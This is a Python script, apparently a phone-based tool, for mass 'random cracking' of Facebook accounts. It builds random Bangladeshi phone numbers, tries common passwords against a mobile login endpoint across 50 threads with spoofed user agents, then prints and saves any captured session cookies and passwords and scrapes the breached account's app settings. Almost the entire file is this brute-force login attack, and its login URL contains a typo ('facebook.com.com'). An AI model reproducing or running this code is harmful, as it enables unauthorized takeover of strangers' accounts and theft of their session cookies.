#jjsbs
#Script         
#    Respotary   Star  
#----------------------------------------------------------------------------------------------------------
#CREATE BY : MUMIT ISLAM HIMU
#WHATSAPP : +8801644777805
#GITHUB : https://github.com/MUMIT-404-CYBER
#----------------------------------------------------------------------------------------------------------
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
for spy in range(10000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' SM-G960U'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,110)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""\x1b[1;97m
  ███    ███ ██████         ███████ ██████  ██    ██ 
  ████  ████ ██   ██        ██      ██   ██  ██  ██  
  ██ ████ ██ ██████         ███████ ██████    ████   
  ██  ██  ██ ██   ██             ██ ██         ██    
  ██      ██ ██   ██ ██     ███████ ██         ██    
                                                   
     ┌───────────────────────────────────────┐
     │ [💸] CODED BY : SHAHIN ALAM           │
     │ [💸] GITHUB   : SPY1x1                │
     │ [💸] WHATSAPP : +8801615161056        │
     │ [💸] VERSION  : A.3                   │
     │ [💸] HACKED   : \033[1;32mMr. SPY \033[1;37m              │
     └───────────────────────────────────────┘""")

logo1 = ("""\x1b[1;97m
  ███    ███ ██████         ███████ ██████  ██    ██ 
  ████  ████ ██   ██        ██      ██   ██  ██  ██  
  ██ ████ ██ ██████         ███████ ██████    ████   
  ██  ██  ██ ██   ██             ██ ██         ██    
  ██      ██ ██   ██ ██     ███████ ██         ██    
                                                   
     ┌───────────────────────────────────────┐
     │ [💸] CODED BY : SHAHIN ALAM           │
     │ [💸] GITHUB   : SPY1x1                │
     │ [💸] WHATSAPP : +8801615161056        │
     │ [💸] VERSION  : A.3                   │
     │ [💸] HACKED   : \033[1;32mMr. SPY \033[1;37m              │
     └───────────────────────────────────────┘""")

def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
    else:
        print("")
        print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
        for i in range(len(game)):
            print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
    else:
        print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
        for i in range(len(game)):
            print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
   

def mumitx():
	print(50*'_')

def Main():
        os.system("clear")
        print(logo)
        print(" [1] RANDOM CRACK")
        print(" [0] Exit")
        Mumit =input("\n [?] Choose : ")
        if Mumit in ["1","01"]:
            fuck()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE CODE: 017, 018, 019, 016')
    kod = input('[?] CHOOSE CODE : ')
    kode = ''.join(random.choice(string.digits) for _ in range(2))
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('[+] Total ids: '+tl)
        print("[+] Your Code: "+kod)
        print('[+] Process has been started')
        print('[+] Use flight mode for more ok ids')
        print(50*'_')
        for love in user:
            uid = kod+kode+kodex+love
            pwx = [uid,kod+kode+kode[:1],kod+kode+kodex,kode+kodex+love,kodex+love,'@#@#@#','@@@###','i love you','Bangladesh']
            #pwx =[uid,kodex+love]
            yaari.submit(mumit2,uid,pwx,tl)
    print('==================================================')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in SPY/OK.txt')
    print(' [+] CP Ids saved in SPY/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[Mr.SPY-RANDOM]--[%s/%s]--[OK-%s]\r'%(loop,tl,len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com.com',
            "method": 'POST',
            "scheme": 'https',
            "accept": 'application/x-www-form-urlencoded',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com.com',
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'empty',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent":pro}
            lo = session.post('https://mbasic.facebook.com.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(50*'_')
                print(f"\033[1;92m[Mr.SPY-OK] {cid}|{ps} \n [📞] PHONE NUMBER : {uid} \n [🍪] Cookie : {coki}")
                #print(f' Useragent : {pro}')
                #print(f"\033[1;94m[Mr.SPY-CP] {cid}|{ps}")
                open('/sdcard/SPY-OK.txt', 'a').write( cid+' | '+ps+'\n')
                cek_apk(session,coki)
                print(50*'_')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;32m[Mr.SPY-CP] {cid}|{ps}")
                #print(f' Useragent : {pro}')
                open('/sdcard/SPY-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
                   
           
Main()
